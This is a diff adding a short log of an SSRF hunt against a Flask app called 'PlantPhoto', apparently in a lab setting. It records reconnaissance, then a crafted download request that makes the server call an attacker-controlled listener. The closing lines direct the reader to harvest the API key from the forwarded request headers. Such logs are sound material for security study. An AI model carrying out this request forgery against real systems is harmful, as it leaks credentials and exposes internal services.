@@ -1,0 +1,17 @@
+=== PlantPhoto SSRF Hunt Log - 2026-03-30 20:45:56.981127 ===
+
+[RECON] Target: http://10.82.168.213
+[RECON] Backend: Werkzeug/0.16.0 Python/3.10.7 (Flask + pycurl)
+[RECON] URL pattern built by app: http://{server}/public-docs-k057230990384293/{id}.pdf
+[RECON] /admin -> 200: "Admin interface only available from localhost!!!"
+[RECON] Internal port 8087 open (secure file storage)
+[RECON] Endpoints found: /, /admin, /download, /static/imgs/*
+
+[SSRF] Triggering SSRF -> 10.82.105.71:9999
+[SSRF] Request URL: http://10.82.168.213/download?server=10.82.105.71:9999&id=1
+[SSRF] App will call: http://10.82.105.71:9999/public-docs-k057230990384293/1.pdf
+
+[SSRF] Error: HTTPConnectionPool(host='10.82.168.213', port=80): Read timed out. (read timeout=15)
+
+>>> CHECK YOUR LISTENER OUTPUT FOR THE API KEY IN THE REQUEST HEADERS <<<
+>>> Look for: Authorization, X-API-Key, Api-Key, or similar headers <<<
